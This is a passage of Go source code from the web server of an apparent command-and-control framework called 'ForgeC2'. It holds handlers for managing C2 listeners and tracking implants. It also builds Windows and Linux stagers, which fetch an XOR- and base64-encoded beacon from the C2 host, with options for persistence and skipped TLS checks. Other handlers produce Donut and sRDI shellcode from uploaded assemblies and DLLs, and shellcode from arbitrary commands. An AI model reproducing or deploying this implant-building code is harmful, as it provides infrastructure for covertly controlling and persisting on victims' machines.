			l.Scheme = "dns"
			l.Protocol = "dns"
		default:
			l.Scheme = "tcp"
			l.Protocol = "tcp"
		}
	}

	l.Enabled = true
	if err := s.db.Create(&l).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"success": true, "listener": l})
}

func (s *Server) handleUpdateListener(c *gin.Context) {
	id := c.Param("id")
	var l db.Listener
	if err := s.db.First(&l, id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "listener not found"})
		return
	}
	var updates struct {
		Name     string `json:"name"`
		Scheme   string `json:"scheme"`
		Type     string `json:"type"`
		Host     string `json:"host"`
		Port     int    `json:"port"`
		Protocol string `json:"protocol"`
		Notes    string `json:"notes"`
		Enabled  *bool  `json:"enabled"`
	}
	if err := c.ShouldBindJSON(&updates); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if updates.Name != "" {
		l.Name = updates.Name
	}
	if updates.Scheme != "" {
		l.Scheme = updates.Scheme
		l.Protocol = updates.Scheme
		switch updates.Scheme {
		case "http", "https":
			l.Type = "http"
		case "dns":
			l.Type = "dns"
		default:
			l.Type = "tcp"
		}
	} else if updates.Protocol != "" {
		l.Protocol = updates.Protocol
		l.Scheme = updates.Protocol
		switch updates.Protocol {
		case "http", "https":
			l.Type = "http"
		case "dns":
			l.Type = "dns"
		default:
			l.Type = "tcp"
		}
	} else if updates.Type != "" {
		l.Type = updates.Type
		switch updates.Type {
		case "http":
			l.Scheme = "http"
			l.Protocol = "http"
		case "dns":
			l.Scheme = "dns"
			l.Protocol = "dns"
		default:
			l.Scheme = "tcp"
			l.Protocol = "tcp"
		}
	}
	if updates.Host != "" {
		l.Host = updates.Host
	}
	if updates.Port != 0 {
		l.Port = updates.Port
	}
	if updates.Notes != "" {
		l.Notes = updates.Notes
	}
	if updates.Enabled != nil {
		l.Enabled = *updates.Enabled
	}
	if err := s.db.Save(&l).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"success": true, "listener": l})
}

func (s *Server) handleDeleteListener(c *gin.Context) {
	id := c.Param("id")

	// Check if any agents are using this listener
	var agentCount int64
	s.db.Model(&db.Implant{}).Where("listener_id = ?", id).Count(&agentCount)
	if agentCount > 0 {
		c.JSON(http.StatusBadRequest, gin.H{
			"error":       fmt.Sprintf("Cannot delete listener: %d agents still using this listener", agentCount),
			"agent_count": agentCount,
		})
		return
	}

	if err := s.db.Delete(&db.Listener{}, id).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"success": true})
}

func (s *Server) handleGenerateStager(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
		DNSDomain     string `form:"dns_domain"`
		DNSServer     string `form:"dns_server"`
	}
	if err := c.ShouldBind(&form); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	isDNS := form.DNSDomain != "" || form.DNSServer != ""
	if !isDNS && form.ListenerID == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "listener is required"})
		return
	}

	if !isDNS {
		var listener db.Listener
		if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
			c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
			return
		}

		sch := listener.Scheme
		if sch == "" {
			sch = listener.Protocol
		}
		if sch == "" {
			sch = "http"
			if listener.Type == "tcp" {
				sch = "tcp"
			}
		}
		form.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)

		if sch == "dns" {
			form.DNSDomain = listener.Host
			if form.DNSServer == "" {
				form.DNSServer = listener.Host
			}
		}
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	cfg := payload.ImplantConfig{
		C2URL:         form.C2URL,
		Protocol:      "http",
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      "forgec2_stage.exe",
		Debug:         false,
		Profile:       form.Profile,
		ListenerID:    form.ListenerID,
	}

	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
	if !filepath.IsAbs(agentsDir) {
		if abs, err := filepath.Abs(agentsDir); err == nil {
			agentsDir = abs
		}
	}

	// Generate the stage (full beacon EXE, XOR-encoded, base64-encoded)
	_, xorKeyHex, err := payload.GenerateStage(cfg, agentsDir)
	if err != nil {
		s.logBuild("windows", "stager", form.C2URL, form.ListenerID, form.Filename, "failed", err.Error(), "")
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	// Use the C2 server address for the stager to download from
	stagerCfg := cfg
	stagerCfg.C2URL = form.C2URL
	stagerCfg.Filename = form.Filename // use user's desired filename for stager

	// Build the stager with C2URL and XORKey injected
	stagerPath, err := payload.GenerateStager(stagerCfg, agentsDir, xorKeyHex)
	if err != nil {
		s.logBuild("windows", "stager", form.C2URL, form.ListenerID, form.Filename, "failed", err.Error(), "")
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	if _, statErr := os.Stat(stagerPath); statErr != nil {
		s.logBuild("windows", "stager", form.C2URL, form.ListenerID, form.Filename, "failed", statErr.Error(), stagerPath)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "stager not found: " + statErr.Error()})
		return
	}

	s.logBuild("windows", "stager", form.C2URL, form.ListenerID, form.Filename, "success", "", stagerPath)
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filepath.Base(stagerPath)))
	c.File(stagerPath)
}

func (s *Server) handleGenerateStagerLinux(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
		DNSDomain     string `form:"dns_domain"`
		DNSServer     string `form:"dns_server"`
	}
	if err := c.ShouldBind(&form); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	isDNS := form.DNSDomain != "" || form.DNSServer != ""
	if !isDNS && form.ListenerID == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "listener is required"})
		return
	}

	if !isDNS {
		var listener db.Listener
		if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
			c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
			return
		}

		sch := listener.Scheme
		if sch == "" {
			sch = listener.Protocol
		}
		if sch == "" {
			sch = "http"
			if listener.Type == "tcp" {
				sch = "tcp"
			}
		}
		form.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)

		if sch == "dns" {
			form.DNSDomain = listener.Host
			if form.DNSServer == "" {
				form.DNSServer = listener.Host
			}
		}
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	cfg := payload.ImplantConfig{
		C2URL:         form.C2URL,
		Protocol:      "http",
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      "forgec2_stage.exe",
		Debug:         false,
		Profile:       form.Profile,
		ListenerID:    form.ListenerID,
	}

	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
	if !filepath.IsAbs(agentsDir) {
		if abs, err := filepath.Abs(agentsDir); err == nil {
			agentsDir = abs
		}
	}

	_, xorKeyHex, err := payload.GenerateStage(cfg, agentsDir)
	if err != nil {
		s.logBuild("linux", "stager", form.C2URL, form.ListenerID, form.Filename, "failed", err.Error(), "")
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	stagerCfg := cfg
	stagerCfg.C2URL = form.C2URL
	stagerCfg.Filename = form.Filename

	stagerPath, err := payload.GenerateStagerLinux(stagerCfg, agentsDir, xorKeyHex)
	if err != nil {
		s.logBuild("linux", "stager", form.C2URL, form.ListenerID, form.Filename, "failed", err.Error(), "")
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	if _, statErr := os.Stat(stagerPath); statErr != nil {
		s.logBuild("linux", "stager", form.C2URL, form.ListenerID, form.Filename, "failed", statErr.Error(), stagerPath)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "stager not found: " + statErr.Error()})
		return
	}

	s.logBuild("linux", "stager", form.C2URL, form.ListenerID, form.Filename, "success", "", stagerPath)
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filepath.Base(stagerPath)))
	c.File(stagerPath)
}

func (s *Server) handleListenersPage(c *gin.Context) {
	var listeners []db.Listener
	s.db.Order("created_at desc").Find(&listeners)

	enabled := 0
	httpC := 0
	tcpC := 0
	dnsC := 0
	for _, l := range listeners {
		if l.Enabled {
			enabled++
		}
		if l.Type == "http" {
			httpC++
		} else if l.Type == "tcp" {
			tcpC++
		} else if l.Type == "dns" {
			dnsC++
		}
	}

	stats := s.getNavStats()
	data := gin.H{
		"Title":        "ForgeC2 - Listeners",
		"ActiveNav":    "listeners",
		"Listeners":    listeners,
		"Total":        len(listeners),
		"EnabledCount": enabled,
		"HttpCount":    httpC,
		"TcpCount":     tcpC,
		"DnsCount":     dnsC,
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPage(c, "listeners_content", data)
}

func (s *Server) handleGenerateDonut(c *gin.Context) {
	file, err := c.FormFile("assembly")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "assembly file required"})
		return
	}
	f, err := file.Open()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	defer f.Close()

	data, err := io.ReadAll(f)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	cfg := payload.DonutConfig{
		Assembly:   data,
		ClassName:  c.PostForm("class"),
		MethodName: c.PostForm("method"),
		Args:       c.PostForm("args"),
		Arch:       c.DefaultPostForm("arch", "amd64"),
		Entropy:    3,
	}

	sc, err := payload.GenerateDonutShellcode(cfg)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	outName := c.DefaultPostForm("filename", "loader.bin")
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", outName))
	c.Data(http.StatusOK, "application/octet-stream", sc)
}

func (s *Server) handleGenerateSRDI(c *gin.Context) {
	file, err := c.FormFile("dll")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "DLL file required"})
		return
	}
	f, err := file.Open()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	defer f.Close()

	data, err := io.ReadAll(f)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	exportName := c.DefaultPostForm("export", "")
	arch := c.DefaultPostForm("arch", "amd64")

	sc, err := payload.GenerateSRDIShellcode(data, exportName, arch == "amd64")
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	outName := c.DefaultPostForm("filename", "rdi_loader.bin")
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", outName))
	c.Data(http.StatusOK, "application/octet-stream", sc)
}

func (s *Server) handleGenerateShellcode(c *gin.Context) {
	cmd := c.PostForm("command")
	if cmd == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "command required"})
		return
	}

	sc, err := payload.GenerateBasicShellcode(cmd)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	outName := c.DefaultPostForm("filename", "shellcode.bin")
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", outName))
	c.Data(http.StatusOK, "application/octet-stream", sc)
}
